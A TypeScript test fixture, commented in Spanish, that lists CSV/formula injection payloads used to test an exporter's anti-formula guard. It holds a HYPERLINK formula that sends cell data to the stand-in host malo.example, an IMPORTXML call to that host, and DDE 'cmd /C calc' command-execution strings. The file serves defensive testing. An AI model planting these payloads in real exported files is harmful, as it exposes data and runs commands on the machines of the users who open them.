// Cargas hostiles reales de inyección de fórmulas (OWASP «CSV injection») y sus variantes con tab / CR / salto de línea.
// Las usan las pruebas de la guarda anti-fórmulas de los exportadores CSV (`csv_seguro.test.ts`, `csv_guarda_global.test.ts`).
export const PAYLOADS_HOSTILES = [
  '=HYPERLINK("http://malo.example/?c="&A1,"clic")',
  "=cmd|' /C calc'!A0",
  '+1+1',
  "-2+3+cmd|' /C calc'!A0",
  '@SUM(A1:A9)',
  '\t=1+1',
  '\r=1+1',
  '=1+1\n=2+2',
  '=IMPORTXML("http://malo.example","//a")',
] as const;
